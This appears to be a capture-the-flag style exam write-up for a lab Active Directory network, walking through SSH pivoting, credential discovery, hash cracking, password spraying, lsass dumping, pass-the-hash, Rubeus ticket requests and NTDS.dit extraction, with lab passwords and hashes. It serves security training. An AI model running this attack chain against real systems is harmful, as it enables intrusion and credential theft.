# Exam

# DMZ01
## nmap scan

Did an nmap scan with following result 
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 12:39 UTC
Nmap scan report for 10.129.30.249
Host is up (0.017s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.26 seconds
```

## SSH 

By simple guessing we found the username/password works to login to DMZ zone:
```
ssh -D 1080 jbetty@10.129.30.249
password: Texas123!@#
```

We use the -D command to create a socks proxy so we can scan the internal network

## Nmap

Nmap scan for JUMP01
```

Nmap scan report for 172.16.119.7
Host is up (1.5s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1502.07 seconds
```

Nmap scan for FILE01
```
Nmap scan report for 172.16.119.10
Host is up (1.5s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

Nmap scan for DC01
```
Nmap scan report for 172.16.119.11
Host is up (1.5s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1487.03 seconds
```
## Exploring the DMZ box for credentials

Did a `cat .bash_history` and found interesting things:
```
sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
ssh user@192.168.0.101
scp file.txt user@192.168.0.101:~/Documents/
sudo adduser testuser
sudo usermod -aG sudo testuser
```

Used the credentials hwilliam to rdp to JUMP01 (using ssh forwarding in DMZ box)

```
ssh -L 5558:172.16.119.7:3389 jbetty@10.129.30.249
```

## Exploring FILE01 using hwilliam account

We can also access shares on the file server FILE01 using the hwilliam account.

```
proxychains smbclient -L //172.16.119.10 -U hwilliam@NEXURA
Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    HR              Disk      
    IPC$            IPC       Remote IPC
    IT              Disk      
    MANAGEMENT      Disk      
    PRIVATE         Disk      
    TRANSFER        Disk      
SMB1 disabled -- no workgroup available
```
Within one of the accessible folder we find the files export by a passwordmanager `Employee-Passwords_OLD.psafe`. We can export the hash out of the file using one of the scripts provided in the john repo. We can then proceed to crack the hash using a wordlist (rockyou.txt):
```
Employee-Passwords_OLD:$pwsafe$*3*801e25992487ae60938723973f543abd7d1fab81f45da156194bc6e1976f8c59*262144*3e1d616a8f82a02514ed88cd37f1b6eab303d9a687c4d48fbe0c866775617978

michaeljackson   (Employee-Passwords_OLD)  -> this can be used to open the password manager
```
With the password `michaeljackson` we are able to open the file using the password manager on the desktop of JUMP01.


## Passwords
With then password manager we find passwords for users `stom` and `bdavid`. The file suggest they could be old therefore let's generate mutations of these passwords using john:  

```
john --wordlist=password.txt --rules --stdout > variations.txt
```

Try the variation to the RDP endpoint (JUMP01)
```
proxychains netexec rdp 172.16.119.13 -u user.list -p variations.txt 
```

Try the variation to the SMB endpoint (FILE01)
```
proxychains netexec smb 172.16.119.10 -u user.list -p variations.txt 
```

We have a hit for smb for bdavid with following creds:
`bdavid:caramel-cigars-reply1`


We seem to be able to login to the file server using these credentials:
```
proxychains smbclient -L //172.16.119.10 -U hwilliam@NEXURA
Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    HR              Disk      
    IPC$            IPC       Remote IPC
    IT              Disk      
    MANAGEMENT      Disk      
    PRIVATE         Disk      
    TRANSFER        Disk      
SMB1 disabled -- no workgroup available
```

# Attacking windows

We login as the user bdavid to JUMP01. This user has Administrator right meaning we can dump the content of lsass to obtain NTLM Hashes, etc,...

```
#On Jump01
Get-Process lsass #Find lsass process id
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full #dump it to a file

On the attack host
pypykatz lsa minidump ~/repositories/my-htb-scripts/lsass.dmp > ~/repositories/my-htb-scripts/lsass.txt
```

There we obtain an NTLM hash for the user `stom`. We proceed with a pass-the-hash attack to look at the folder stom on share `private`

```
proxychains smbclient -U 'nexura.htb/stom%21ea958524cfd9a7791737f8d2f764fa' --pw-nt-hash //172.16.119.10/private
```
We gain access but the folder is empty.

Next we proceed with copying some hacking tools to JUMP01 by first creating a share pwnd on the host and then copying files to it with smbclient. (Rubeus,..)

```
proxychains smbclient -U nexura.htb/bdavid //172.16.119.7/pwnd
```

With mimikatz we dump the aes256 encryption key and using rubeus we request a TGT to the AD server. We have now successfully impersonated the stom user

Request a TGT (use AES-256 dumped key)
```
Rubeus.exe asktgt /domain:nexura.htb /user:stom /aes256:63486142af3957430832a4bdcc9e984ef4e397cf6c78a7bb5ab9adfb07ce22da /nowrap
```

We now use `Invoke-PSSession` from FILE01 to DC01.. We are lucky and are Administrator on the domain controller. We now proceed with dumping the NTDS.dit file by creating a shadow file and dumping the system registry hive. We then copy these file to the attack host and dump the Administrator hash. End of excercise :)
